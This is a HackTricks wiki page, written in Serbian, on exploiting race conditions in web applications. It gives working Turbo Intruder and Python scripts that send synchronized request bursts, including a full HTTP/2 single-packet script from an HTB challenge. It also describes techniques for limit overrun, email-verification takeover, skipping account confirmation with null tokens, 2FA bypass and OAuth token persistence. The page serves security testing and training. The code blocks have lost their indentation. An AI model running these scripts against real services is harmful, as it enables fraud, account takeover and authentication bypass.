# Race Condition

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Nauƒçite hakovanje AWS od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

{% hint style="warning" %}
Za dublje razumevanje ove tehnike pogledajte originalni izve≈°taj na [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Unapreƒëenje napada trkaƒçkog uslova

Glavna prepreka u iskori≈°ƒáavanju trkaƒçkih uslova je osigurati da se vi≈°estruki zahtevi obraƒëuju istovremeno, sa **vrlo malom razlikom u njihovim vremenima obrade‚Äîidealno, manje od 1ms**.

Ovde mo≈æete pronaƒái neke tehnike za sinhronizaciju zahteva:

#### Napad jednim paketom HTTP/2 naspram sinhronizacije poslednjeg bajta HTTP/1.1

* **HTTP/2**: Podr≈æava slanje dva zahteva preko jedne TCP veze, smanjujuƒái uticaj mre≈ænog zastoja. Meƒëutim, zbog varijacija na serverskoj strani, dva zahteva mo≈æda nisu dovoljna za dosledan napad trkaƒçkog uslova.
* **HTTP/1.1 'Sinhronizacija poslednjeg bajta'**: Omoguƒáava prethodno slanje veƒáine delova 20-30 zahteva, zadr≈æavajuƒái mali fragment, koji se zatim ≈°alje zajedno, posti≈æuƒái istovremeni dolazak na server.

**Priprema za sinhronizaciju poslednjeg bajta** ukljuƒçuje:

1. Slanje zaglavlja i podataka tela bez poslednjeg bajta bez zavr≈°etka toka.
2. Pauziranje 100ms nakon poƒçetnog slanja.
3. Onemoguƒáavanje TCP\_NODELAY-a radi kori≈°ƒáenja Nagleovog algoritma za grupisanje finalnih okvira.
4. Pingovanje za zagrevanje veze.

Naknadno slanje zadr≈æanih okvira trebalo bi rezultirati njihovim dolaskom u jednom paketu, ≈°to se mo≈æe proveriti putem Wireshark-a. Ovaj metod se ne primenjuje na statiƒçke datoteke, koje obiƒçno nisu ukljuƒçene u napade trkaƒçkog uslova.

### Prilagoƒëavanje arhitekturi servera

Razumevanje arhitekture cilja je kljuƒçno. Serveri na prednjoj strani mogu usmeravati zahteve na razliƒçite naƒçine, ≈°to utiƒçe na vreme. Prediktivno zagrevanje serverske veze, putem nebitnih zahteva sa serverske strane, mo≈æe normalizovati vreme zahteva.

#### Obrada zakljuƒçavanja na osnovu sesije

Okviri kao ≈°to je PHP-ov rukovalac sesijama serijski obraƒëuju zahteve po sesiji, potencijalno prikrivajuƒái ranjivosti. Kori≈°ƒáenje razliƒçitih sesijskih tokena za svaki zahtev mo≈æe zaobiƒái ovaj problem.

#### Prevazila≈æenje ograniƒçenja brzine ili resursa

Ako zagrevanje veze nije efikasno, namerno izazivanje ka≈°njenja ograniƒçenja brzine ili resursa veb servera putem poplave la≈ænih zahteva mo≈æe olak≈°ati napad jednim paketom indukujuƒái ka≈°njenje sa serverske strane pogodno za trkaƒçke uslove.

## Primeri napada

* **Tubo Intruder - Napad jednim paketom HTTP2 (1 endpoint)**: Mo≈æete poslati zahtev **Turbo intruder-u** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), mo≈æete promeniti vrednost koju ≈æelite da probate silom za **`%s`** kao u `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` a zatim izabrati **`examples/race-single-packer-attack.py`** iz padajuƒáeg menija:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako ƒáete **slati razliƒçite vrednosti**, mo≈æete izmeniti kod sa ovim koji koristi wordlistu sa clipboard-a:

```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```

{% hint style="warning" %}
Ako web ne podr≈æava HTTP2 (samo HTTP1.1), umesto `Engine.BURP2` koristite `Engine.THREADED` ili `Engine.BURP`.
{% endhint %}

* **Tubo Intruder - HTTP2 napad jednim paketom (Vi≈°e krajnjih taƒçaka)**: U sluƒçaju da treba poslati zahtev ka jednoj krajnjoj taƒçki, a zatim vi≈°e zahteva ka drugim krajnjim taƒçkama kako bi se pokrenuo RCE, mo≈æete promeniti skriptu `race-single-packet-attack.py` na ne≈°to sliƒçno:

```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```

* Takoƒëe je dostupno u **Repeater-u** putem nove opcije '**Slanje grupe paralelno**' u Burp Suite-u.
* Za **prekoraƒçenje ograniƒçenja** mo≈æete jednostavno dodati **isti zahtev 50 puta** u grupu.
* Za **zagrevanje veze**, mo≈æete **dodati** na **poƒçetak grupe** neke **zahteve** ka nekom nestatiƒçkom delu veb servera.
* Za **odlaganje** procesa **izmeƒëu** obrade **jednog zahteva i drugog** u 2 podstanja koraka, mo≈æete **dodati dodatne zahteve izmeƒëu** oba zahteva.
* Za **vi≈°estruki** RC mo≈æete poƒçeti slati **zahtev** koji **ide ka skrivenom stanju** a zatim **50 zahteva** odmah nakon toga koji **eksploati≈°u skriveno stanje**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **Automatizovani Python skript**: Cilj ovog skripta je da promeni email korisnika dok kontinuirano proverava dok verifikacioni token novog emaila ne stigne na poslednji email (ovo je zato ≈°to je u kodu primeƒáen RC gde je bilo moguƒáe modifikovati email ali imati verifikaciju poslatu na stari email jer je promenljiva koja oznaƒçava email veƒá bila popunjena prvom).\
  Kada se reƒç "objetivo" pronaƒëe u primljenim emailovima, znamo da smo primili verifikacioni token promenjenog emaila i zavr≈°avamo napad.

```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```

### Sirovi BF

Prethodno istra≈æivanje je koristilo sledeƒáe niske koje su poku≈°avale da po≈°alju pakete ≈°to je br≈æe moguƒáe kako bi izazvale RC.

* **Ponavljaƒç:** Pogledajte primere iz prethodnog odeljka.
* **Upadaƒç:** Po≈°aljite **zahtev** Upadaƒçu, postavite **broj niti** na **30** unutar **Opcija menija** i izaberite niske **Nul niske** kao niske za napad i generi≈°ite **30.**
* **Turbo Upadaƒç**

```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```

* **Python - asyncio**

```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```

## **Metodologija RC**

### Prekoraƒçenje ograniƒçenja / TOCTOU

Ovo je najosnovniji tip trke uslova gde se **ranjivosti** pojavljuju na mestima koja **ograniƒçavaju broj puta kada mo≈æete izvr≈°iti akciju**. Na primer, kori≈°ƒáenje istog koda za popust u veb prodavnici vi≈°e puta. Veoma jednostavan primer mo≈æe se pronaƒái u [**ovom izve≈°taju**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ili u [**ovom bug-u**](https://hackerone.com/reports/759247)**.**

Postoji mnogo varijacija ovakvih napada, ukljuƒçujuƒái:

* Vi≈°estruko iskori≈°ƒáavanje poklon kartice
* Ocena proizvoda vi≈°e puta
* Podizanje ili prenos gotovine preko stanja na va≈°em raƒçunu
* Ponovno kori≈°ƒáenje jedinstvenog re≈°enja CAPTCHA
* Zaobila≈æenje ograniƒçenja brzine protiv brute force napada

### **Skrivene podstanice**

Iskori≈°ƒáavanje slo≈æenih trka uslova ƒçesto ukljuƒçuje iskori≈°ƒáavanje kratkih prilika za interakciju sa skrivenim ili **neplaniranim podstanicama ma≈°ine**. Evo kako pristupiti ovome:

1. **Identifikacija Potencijalnih Skrivenih Podstanica**

* Poƒçnite tako ≈°to ƒáete identifikovati krajnje taƒçke koje menjaju ili interaguju sa kritiƒçnim podacima, kao ≈°to su korisniƒçki profili ili procesi resetovanja lozinke. Fokusirajte se na:
* **Skladi≈°tenje**: Preferirajte krajnje taƒçke koje manipuli≈°u server-side persistentnim podacima u odnosu na one koje obraƒëuju podatke na strani klijenta.
* **Akcija**: Potra≈æite operacije koje menjaju postojeƒáe podatke, koje su verovatnije da ƒáe stvoriti iskori≈°ƒáive uslove u poreƒëenju sa onima koje dodaju nove podatke.
* **Kljuƒçanje**: Uspe≈°ni napadi obiƒçno ukljuƒçuju operacije kljuƒçane na isti identifikator, npr. korisniƒçko ime ili token za resetovanje.

2. **Sprovedite Poƒçetno Ispitivanje**

* Testirajte identifikovane krajnje taƒçke sa napadima trke uslova, posmatrajuƒái bilo kakve odstupanja od oƒçekivanih rezultata. Neoƒçekivani odgovori ili promene u pona≈°anju aplikacije mogu ukazati na ranjivost.

3. **Poka≈æite Ranjivost**

* Su≈æite napad na minimalan broj zahteva potrebnih za iskori≈°ƒáavanje ranjivosti, ƒçesto samo dva. Ovaj korak mo≈æe zahtevati vi≈°e poku≈°aja ili automatizaciju zbog preciznog vremena ukljuƒçenog.

### Napadi Osetljivi na Vreme

Preciznost u vremenskom slanju zahteva mo≈æe otkriti ranjivosti, posebno kada se koriste predvidljive metode poput vremenskih oznaka za sigurnosne tokene. Na primer, generisanje tokena za resetovanje lozinke na osnovu vremenskih oznaka moglo bi omoguƒáiti identiƒçne tokene za istovremene zahteve.

**Za Iskori≈°ƒáavanje:**

* Koristite precizno vreme, poput napada sa jednim paketom, da biste poslali istovremene zahteve za resetovanje lozinke. Identifikacija identiƒçnih tokena ukazuje na ranjivost.

**Primer:**

* Zatra≈æite dva tokena za resetovanje lozinke istovremeno i uporedite ih. Podudarajuƒái tokeni ukazuju na gre≈°ku u generisanju tokena.

**Proverite ovaj** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **da isprobate ovo.**

## Studije sluƒçaja skrivenih podstanica

### Plati & dodaj stavku

Proverite ovaj [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) da vidite kako **platiti** u prodavnici i **dodati dodatnu** stavku za koju **neƒáete morati platiti**.

### Potvrdi druge e-po≈°te

Ideja je **verifikovati adresu e-po≈°te i istovremeno je promeniti u drugu** kako biste saznali da li platforma verifikuje novu promenjenu adresu.

### Promeni e-po≈°tu u 2 adrese zasnovano na kolaƒçiƒáima

Prema [**ovom istra≈æivanju**](https://portswigger.net/research/smashing-the-state-machine) Gitlab je bio ranjiv na preuzimanje na ovaj naƒçin jer bi mogao **poslati** token za **verifikaciju e-po≈°te jedne adrese na drugu adresu**.

**Proverite ovaj** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **da isprobate ovo.**

### Skrivene stanice baze podataka / Bypass potvrde

Ako se koriste **2 razliƒçita upisa** za **dodavanje** **informacija** unutar **baze podataka**, postoji mali vremenski period kada je **samo prvi podatak upisan** unutar baze podataka. Na primer, prilikom kreiranja korisnika **korisniƒçko ime** i **lozinka** mogu biti **upisani** a zatim **token** za potvrdu novo kreiranog naloga je upisan. To znaƒçi da je tokom kratkog vremena **token za potvrdu naloga null**.

Stoga, **registrovanje naloga i slanje nekoliko zahteva sa praznim tokenom** (`token=` ili `token[]=` ili bilo koja druga varijacija) za odmah potvrƒëivanje naloga mo≈æe omoguƒáiti da se **potvrdi nalog** gde ne kontroli≈°ete e-po≈°tu.

**Proverite ovaj** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **da isprobate ovo.**

### Bypass 2FA

Sledeƒái pseudo-kod je ranjiv na trku uslova jer u vrlo kratkom vremenu **2FA nije primenjen** dok je sesija kreirana:

```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```

### OAuth2 veƒçna upornost

Postoji nekoliko [**OAuth provajdera**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Ovi servisi ƒáe vam omoguƒáiti da kreirate aplikaciju i autentifikujete korisnike koje je provajder registrovao. Da biste to uradili, **klijent** ƒáe morati da **dozvoli va≈°oj aplikaciji** pristup nekim od njihovih podataka unutar **OAuth provajdera**.\
Dakle, do sada samo obiƒçna prijava sa google/linkedin/github... gde vam se prikazuje stranica koja ka≈æe: "_Aplikacija \<InsertCoolName> ≈æeli da pristupi va≈°im informacijama, da li ≈æelite da to dozvolite?_"

#### Trkaƒçki uslov u `authorization_code`

**Problem** se javlja kada ga **prihvatite** i automatski ≈°alje **`authorization_code`** zlonamerno aplikaciji. Zatim, ova **aplikacija zloupotrebljava Trkaƒçki uslov u OAuth servisu provajdera kako bi generisala vi≈°e od jednog AT/RT** (_Authentication Token/Refresh Token_) iz **`authorization_code`** za va≈° nalog. U osnovi, zloupotrebiƒáe ƒçinjenicu da ste dozvolili aplikaciji pristup va≈°im podacima da **kreira vi≈°e naloga**. Zatim, ako **zaustavite dozvolu aplikaciji da pristupi va≈°im podacima jedan par AT/RT ƒáe biti obrisan, ali drugi ƒáe i dalje biti validan**.

#### Trkaƒçki uslov u `Refresh Token`

Kada jednom **dobijete validan RT** mo≈æete poku≈°ati da ga **zloupotrebite kako biste generisali vi≈°e AT/RT** i **ƒçak ako korisnik otka≈æe dozvole** zlonamernoj aplikaciji da pristupi njegovim podacima, **vi≈°e RT-ova ƒáe i dalje biti validno**.

## **RC u WebSockets**

Na [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) mo≈æete pronaƒái PoC u Javi za slanje websocket poruka **paralelno** kako biste zloupotrebili **Trkaƒçke uslove takoƒëe u Web Sockets**.

## Reference

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako kreirate i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
